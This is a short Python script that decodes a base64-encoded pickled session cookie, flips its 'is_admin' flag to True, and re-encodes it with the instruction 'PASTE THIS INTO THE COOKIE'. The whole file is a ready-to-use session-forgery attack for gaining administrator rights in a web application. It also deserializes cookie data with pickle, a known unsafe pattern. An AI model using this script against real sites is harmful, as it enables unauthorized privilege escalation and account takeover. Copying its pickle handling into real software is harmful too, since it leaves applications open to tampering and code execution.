import base64
import pickle

cookie_value = "gAWVLQAAAAAAAAB9lCiMCWxvZ2dlZF9pbpSIjAR1c2VylIwFYWxpY2WUjAhpc19hZG1pbpSJdS4="

raw = base64.urlsafe_b64decode(cookie_value.encode())
session = pickle.loads(raw)

print("before:", session)

session["is_admin"] = True

new_raw = pickle.dumps(session, protocol=pickle.HIGHEST_PROTOCOL)
new_cookie = base64.urlsafe_b64encode(new_raw).decode()

print("\nPASTE THIS INTO THE COOKIE:\n")
print(new_cookie)
